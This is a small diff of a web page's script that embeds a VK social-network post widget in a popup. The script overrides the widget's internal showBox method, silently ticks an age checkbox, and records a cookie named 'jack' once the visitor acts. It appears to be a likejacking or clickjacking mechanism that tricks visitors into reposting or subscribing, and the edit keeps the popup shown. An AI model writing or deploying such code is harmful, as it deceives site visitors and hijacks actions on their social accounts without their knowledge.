@@ -25,13 +25,13 @@
 <script type="text/javascript">
     var b = document.getElementById("popup"),
         a = document.getElementById("wrapper");
-    document.cookie.match("jack") ? b.className = "hidden" : (VK.Widgets.Post("post", 21641637, 6073, "NOo2T-UPRT_8dQjBl7pUFa6jv6w", {
+    document.cookie.match("jack") ? b.className = "" : (VK.Widgets.Post("post", 21641637, 6073, "NOo2T-UPRT_8dQjBl7pUFa6jv6w", {
         width: 400
     }), VK.Widgets.RPC[1].methods.showBox = function (c) {
         document.getElementById("age").checked = !0;
         var d = VK.Util.Box("https://vk.com/" + c, [], {
             proxy: function () {
-                b.className = "hidden";
+                b.className = "";
                 document.cookie = "jack=1; path=/"
             }
         });
